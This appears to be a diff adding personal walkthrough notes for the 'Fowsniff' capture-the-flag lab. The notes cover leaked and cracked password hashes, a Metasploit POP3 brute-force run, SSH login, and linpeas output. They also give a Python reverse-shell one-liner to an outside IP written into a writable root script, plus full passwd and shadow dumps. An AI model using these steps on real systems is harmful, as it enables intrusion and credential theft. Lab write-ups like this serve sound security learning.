@@ -1,0 +1,191 @@
+
+					
+
+					recon
+
+
+					OSINT - twitter
+
+mauer:8a28a94a588a95b80163709ab4313aa4
+mustikka:ae1644dac5b77c0cf51e0d26ad6d7e56
+tegel:1dc352435fecca338acfd4be10984009
+baksteen:19f5af754c31f1e2651edde9250d69bb
+seina:90dc16d47114aa13671c697fd506cf26
+stone:a92b8a29ef1183192e3d35187e0cfabd
+mursten:0e9588cb62f4b6f27e33d449e2ba0b3b
+parede:4d6e42f56e127803285a0a7649b5ab11
+sciana:f7fd98d380735e859f8b2ffbbede5a7e
+
+
+
+
+
+					hashing 
+
+(cracked with rockyou)
+
+$john --show --format=Raw-MD5 hashes.txt 
+mauer:mailcall
+mustikka:bilbo101
+tegel:apples01
+baksteen:skyler22
+seina:scoobydoo2
+mursten:carp4ever
+parede:orlando12
+sciana:07011972
+
+
+
+
+					metsploit (brute pop3 login)
+
+>use auxiliary/scanner/pop3/pop3_login
+>set PASS_FILE /home/*******/Documents/thm/Fowsniff_CTF/exploitation/passes.txt
+>set USER_FILE /home/*******/Documents/thm/Fowsniff_CTF/exploitation/users.txt
+>set RHOSTS 10.10.27.229
+>run
+
+user:seinsa
+passwd:scoobydoo2
+
+
+
+					pop3
+
+
+From: stone@fowsniff (stone)
+
+The temporary password for SSH is "S1ck3nBluff+secureshell"
+
+A.J Stone
+
+
+
+
+					ssh
+
+[22][ssh] host: 10.10.27.229   login: baksteen   password: S1ck3nBluff+secureshell
+
+
+
+					
+
+					privesc
+
+*linpeas
+
+[+] Searching specific hashes inside files - less false positives (limit 70)
+/etc/dovecot/fowsniff_creds.db:$1$Flf65lt9$Ug9WkwRCGfCrYHw.9iFEr.
+/etc/dovecot/cred_dev/c.txt:$1$twogBTKH$eZnOl65b9X3GnxFaj5UNq1
+/etc/dovecot/cred_dev/doinks_md5crypt.txt:$1$twogBTKH$eZnOl65b9X3GnxFaj5UNq1
+/etc/dovecot/cred_dev/doinks_db.txt:$1$twogBTKH$eZnOl65b9X3GnxFaj5UNq1
+
+
+
+
++] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group users:
+/opt/cube/cube.sh
+  Group baksteen:
+/home/baksteen
+
+
+
+
+*edit the cube file
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.26.235",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+*took me forever tp figure out but make sure to remeber quotation marks around your ip
+
+
+
+						
+						shits&gigs
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+postfix:x:108:115::/var/spool/postfix:/bin/false
+dovecot:x:109:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+dovenull:x:110:118:Dovecot login user,,,:/nonexistent:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+stone:x:1000:1000:stone,,,:/home/stone:/bin/bash
+parede:x:1001:100::/home/parede:/bin/bash
+mauer:x:1002:100::/home/mauer:/bin/bash
+sciana:x:1003:100::/home/sciana:/bin/bash
+baksteen:x:1004:100::/home/baksteen:/bin/bash
+mursten:x:1005:100::/home/mursten:/bin/bash
+tegel:x:1006:100::/home/tegel:/bin/bash
+seina:x:1007:100::/home/seina:/bin/bash
+mustikka:x:1008:100::/home/mustikka:/bin/bash
+
+
+
+
+
+root:!:17599:0:99999:7:::
+daemon:*:17599:0:99999:7:::
+bin:*:17599:0:99999:7:::
+sys:*:17599:0:99999:7:::
+sync:*:17599:0:99999:7:::
+games:*:17599:0:99999:7:::
+man:*:17599:0:99999:7:::
+lp:*:17599:0:99999:7:::
+mail:*:17599:0:99999:7:::
+news:*:17599:0:99999:7:::
+uucp:*:17599:0:99999:7:::
+proxy:*:17599:0:99999:7:::
+www-data:*:17599:0:99999:7:::
+backup:*:17599:0:99999:7:::
+list:*:17599:0:99999:7:::
+irc:*:17599:0:99999:7:::
+gnats:*:17599:0:99999:7:::
+nobody:*:17599:0:99999:7:::
+systemd-timesync:*:17599:0:99999:7:::
+systemd-network:*:17599:0:99999:7:::
+systemd-resolve:*:17599:0:99999:7:::
+systemd-bus-proxy:*:17599:0:99999:7:::
+syslog:*:17599:0:99999:7:::
+_apt:*:17599:0:99999:7:::
+messagebus:*:17599:0:99999:7:::
+uuidd:*:17599:0:99999:7:::
+postfix:*:17599:0:99999:7:::
+dovecot:*:17599:0:99999:7:::
+dovenull:*:17599:0:99999:7:::
+sshd:*:17599:0:99999:7:::
+stone:$6$ZqwLmndIR6qU/tlM$7XJ3dgO8oZEn1E660b.wCzIMgckjuiGfZookllpHR0hF4gwvZKMx1EFdop7EEYQKb/vp2nDCHWtiI/AKsOipf0:17599:0:99999:7:::
+parede:$6$4NrmVKhIshBwUKlP$.IWJgjBi3632kwarmPY/8471zjGtzwG6/c3y6nVAnucrO0Q16zgzi3AKhqNtB/ibjrumKZQeGfGyAlYyAt52z/:17599:0:99999:7:::
+mauer:$6$KLSaMNK.HGvomEm.$SZDQMudWshlWVkmdjTzaJCC7RWGhDWB6hCerqFNa8V/CEFlz.nqHsjJsVOTxH82uXH3WLnHynxg/.RsQZX5Ff.:17599:0:99999:7:::
+sciana:$6$e55ofVQ6bRmCJlSD$oIkxRih2ZtgAlcsWQQegBprvd0cZzAviF4bBDpVP1JtOG4z.dxCED8gDdhx4P19JyzjI3WviR/IG.aj/M82o10:17599:0:99999:7:::
+baksteen:$6$bIo9CngbzkgWaPH1$EVbxyUTrMjMVL85998hxMafLyXqvbNqSnFUx2a.B.GcyV4f0GBsEfUYjxciSZaKI5KPgH0ayY9VhbGHl1rbye1:17599:0:99999:7:::
+mursten:$6$oc9lFfcr/NXCLJih$4IAE/SCPjGL1dYdxIFp0Pu21L0UGfRYyXXy500zbNNxmWZ.I8IAMOvr0sZt7iasxMMlq0nohjy4oCtP51B4k8/:17599:0:99999:7:::
+tegel:$6$GI4IXaSf3SFiJ7H6$1KSGYui7ZRR.IIW0.nUin9m3Umh/qeOELfiphxMn.bpky5Docmjs2UEg9h2GaqpNdr0uizMaDNhy/A7NnjmHY/:17599:0:99999:7:::
+seina:$6$.RXMM6MCm5BsTW8h$eoh0UgmvH.Bri51YLo7q4a273Mrjn.tHhKocHJTDcZtRhhv.ULzZpUbWGnM5E5ELPFhRex00rZ.MqCG1XSL6c.:17599:0:99999:7:::
+mustikka:$6$b8arGcXk5Efqw/IX$YEyI.Cch1N3QBQtriJ86qXWaP36XSed7ujgM.cEPdwqZaRjXGmsaleey42XK0wRB2WcQqXBAOIOVK3yCyWNXN.:17599:0:99999:7:::
